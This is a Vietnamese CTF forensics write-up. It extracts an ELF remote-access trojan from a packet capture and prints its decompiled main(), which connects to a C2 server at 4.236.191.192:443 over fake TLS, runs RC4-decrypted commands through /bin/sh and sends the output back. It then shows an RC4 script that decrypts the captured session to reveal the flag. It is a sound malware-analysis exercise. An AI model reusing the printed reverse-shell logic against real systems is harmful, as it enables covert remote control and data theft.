# Mô tả

**Category** : Forensic **Points** : 500

Tôi cá là ở đây không có gì sú bằng kho báu của Trương Mỹ Lan

Flag format: FUSec{...}

**Bài cho ta một file pcapng**

# Phân tích

Lười quá, mở `exports/http/application-octetstream` xuất file `treasure`(ELF binary) ra, ném vào IDA xem hàm `main()`

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 buf_cmd[5008]; // [rsp+10h] [rbp-27A0h] BYREF
  char buf_res[5000]; // [rsp+13A0h] [rbp-1410h] BYREF
  int pipes[2]; // [rsp+2728h] [rbp-88h] BYREF
  unsigned __int8 key[17]; // [rsp+2730h] [rbp-80h] BYREF
  sockaddr_in serv_addr; // [rsp+2750h] [rbp-60h] BYREF
  unsigned __int8 *fin_res; // [rsp+2768h] [rbp-48h]
  unsigned __int8 *ciphertext; // [rsp+2770h] [rbp-40h]
  pid_t pid; // [rsp+277Ch] [rbp-34h]
  unsigned __int8 *cmd; // [rsp+2780h] [rbp-30h]
  unsigned __int8 *cmd_enc; // [rsp+2788h] [rbp-28h]
  int valread; // [rsp+2794h] [rbp-1Ch]
  int client_fd; // [rsp+2798h] [rbp-18h]
  int sock; // [rsp+279Ch] [rbp-14h]
  int buf_res_s; // [rsp+27A0h] [rbp-10h]
  int cmd_s; // [rsp+27A4h] [rbp-Ch]
  __int64 cod; // [rsp+27A8h] [rbp-8h]

  sock = socket(2, 1, 0);
  if ( sock >= 0 )
  {
    serv_addr.sin_family = 2;
    serv_addr.sin_port = htons(0x1BBu);
    if ( inet_pton(2, "4.236.191.192", &serv_addr.sin_addr) > 0 )
    {
      client_fd = connect(sock, (const struct sockaddr *)&serv_addr, 0x10u);
      if ( client_fd >= 0 )
      {
        snd_cli_hel(sock);
        cnsm_serv_hel_plus(sock);
        snd_cli_hel_fin(sock);
        while ( 1 )
        {
          *(_QWORD *)key = 0x469F7D875D0AE179LL;
          *(_QWORD *)&key[8] = 2730215349196570953LL;
          key[16] = 0;
          memset(buf_cmd, 0, 5000u);
          valread = read(sock, buf_cmd, 5000u);
          cod = end_tst()
              ? (buf_cmd[1] << 8) + (buf_cmd[0] << 16) + buf_cmd[2]
              : buf_cmd[0] + (buf_cmd[1] << 8) + (buf_cmd[2] << 16);
          if ( cod != 1508099 )
            break;
          if ( end_tst() )
            cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
          else
            cmd_s = (buf_cmd[4] << 8) + buf_cmd[3];
          cmd_enc = (unsigned __int8 *)malloc(cmd_s + 1);
          memcpy(cmd_enc, &buf_cmd[5], cmd_s);
          cmd_enc[cmd_s] = 0;
          cmd = (unsigned __int8 *)malloc(cmd_s + 1);
          rc2(key, cmd_enc, cmd, cmd_s);
          cmd[cmd_s] = 0;
          memset(buf_res, 0, sizeof(buf_res));
          if ( pipe(pipes) == -1 )
            exit(1);
          pid = fork();
          if ( pid == -1 )
            exit(1);
          if ( !pid )
          {
            dup2(pipes[1], 1);
            dup2(pipes[1], 2);
            close(pipes[0]);
            close(pipes[1]);
            execl("/bin/sh", "sh", "-c", cmd, 0);
            exit(1);
          }
          close(pipes[1]);
          buf_res_s = read(pipes[0], buf_res, 0x1388u);
          wait(0);
          if ( !buf_res_s )
          {
            buf_res_s = 13;
            strncpy(buf_res, "(No Return)\n", 0xDu);
          }
          ciphertext = (unsigned __int8 *)malloc(buf_res_s);
          rc2(key, (unsigned __int8 *)buf_res, ciphertext, buf_res_s);
          fin_res = (unsigned __int8 *)malloc(buf_res_s + 5);
          *fin_res = 23;
          fin_res[1] = 3;
          fin_res[2] = 3;
          fin_res[3] = 0;
          fin_res[4] = buf_res_s;
          memcpy(fin_res + 5, ciphertext, buf_res_s);
          send(sock, fin_res, buf_res_s + 5, 0);
          free(cmd_enc);
          free(cmd);
          free(ciphertext);
          free(fin_res);
        }
        close(client_fd);
        return 0;
      }
      else
      {
        puts("Connection Failed");
        return 1;
      }
    }
    else
    {
      puts("Invalid address: Address not supported");
      return 1;
    }
  }
  else
  {
    puts("Socket creation error");
    return 1;
  }
}
```

Đây là một con RAT, kết nối đến 1 server C2 của hacker là **4.236.191.192:443** qua protocol **TLS giả mạo** `snd_cli_hel`, `cnsm_serv_hel_plus`, `snd_cli_hel_fin`

Sau đó nhận lệnh được mã hoá từ C2 server:

```c
if ( cod != 1508099 )
            break;
          if ( end_tst() )
            cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
          else
            cmd_s = (buf_cmd[4] << 8) + buf_cmd[3];
          cmd_enc = (unsigned __int8 *)malloc(cmd_s + 1);
          memcpy(cmd_enc, &buf_cmd[5], cmd_s);
          cmd_enc[cmd_s] = 0;
          cmd = (unsigned __int8 *)malloc(cmd_s + 1);
          rc2(key, cmd_enc, cmd, cmd_s);
          cmd[cmd_s] = 0;
```

- Kiểm tra 3 byte đầu nếu đúng 3 byte **1508099**(0x170303) tương đương với **TLS application data** thì xử lí tiếp ko thì break

- Trích độ dài và nội dung lệnh từ byte thứ 6 hay là **buf_cmd[5]** sau đó giải mã bằng hàm **rc2()** thực ra nếu để ý kỹ và đi vào trong hàm **rc2()** sẽ thấy rằng thực ra hàm này đang sử dụng mã hoá **RC4** đặt tên như vậy chỉ để lừa chatgbt thôi

Giải mã xong thực hiện câu lệnh đó, lấy output rồi mã hoá cũng dùng hàm **rc2() - Áp dụng mã hoá RC4** gửi lại C2 server cũng qua giả mạo protocol **TLS application data**

Biết vậy rồi thì ta sẽ lấy trực tiếp **tls.app_data** ở trong file pcapng ra luôn (Lưu ý bỏ 3 data của packet đầu đi vì nó chỉ là handshake, không có data bị mã hoá) 

```bash
$ tshark -r chall.pcapng -Y "ip.addr == 4.236.191.192 && tls" -T fields -e tls.app_data
```

Sau đó tạo 1 script decrypt sử dụng mã hoá **RC4**

```python
def rc4_crypt(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(byte ^ K)

    return bytes(out)


# Static key from binary
key = bytes([
    0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0x46,
    0x49, 0x41, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25
])

# Encrypted hex strings (each line from data.txt)
hex_lines = [
    "b3cc4f",
    "ecd34463f5800cb582fe7045725d733c8ad62a1d1cc08743",
    "b4d3446ffdc6",
    "b7c9427efcca0ccd",
    "aadf",
    "b6d24f33a19f48f7c3fa6e49761e5227d498211b1999c57965e826af94cc15ca66e255e1413513f9a7d2e76085252043ca55ba8d91afa48d5df69da1bac8492ef77dcc51c300d214179539a2569e4458c2c764850ff9f329223caf8f371b5c122a2c4fd5f3deae511e626e8342a67f0111dc53afc1a8d56d47bc2331c421e9bac67f95e596f6f4d89887520a88cb09a646896aee5a0a1d1c1597e34cf5fb4204b76ff91cb6b62c8bbb7c8301b6055eb6362213f6e564054c511bd144867dacbb38c0ba3def74055e8ebf78dd286d24e6487678f5deef",
    "a6d84361b0e92d948eed67463219040ca9f4152d4cd7ab3a65b53daf8e940bc15cf40eb4532f14e4aa",
    "85ee786bf3d41ef380bd43744a2168628ee735421097802164b6698484d710d36bfe14bc2c",
    "a6d84361b08d01a89eae74417017173198dd28520dd39a2c31f86ca2c6c70ad47ab45cff06370be2b2c5f425cd61",
    "ebf5442ec2ca0cb299e0352a06",
]

# Decrypt each line
decrypted_lines = []
for hex_str in hex_lines:
    ciphertext = bytes.fromhex(hex_str)
    plaintext = rc4_crypt(key, ciphertext)
    decrypted_lines.append(plaintext.decode(errors="replace"))  # replace undecodable chars

for line in decrypted_lines:
    print(line)
```

# Flag

ngon

```bash
$ python decode.py
pwd
/home/triplet/Downloads

whoami
triplet

id
uid=1000(triplet) gid=1000(triplet) groups=1000(triplet),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)

echo FUSec{f4k3_TLS_1s_s0m3th1ng_bruuhhh}
FUSec{f4k3_TLS_1s_s0m3th1ng_bruuhhh}

echo "you have been pwned by bory" > pwned.txt
(No Return)
```

`FUSec{f4k3_TLS_1s_s0m3th1ng_bruuhhh}`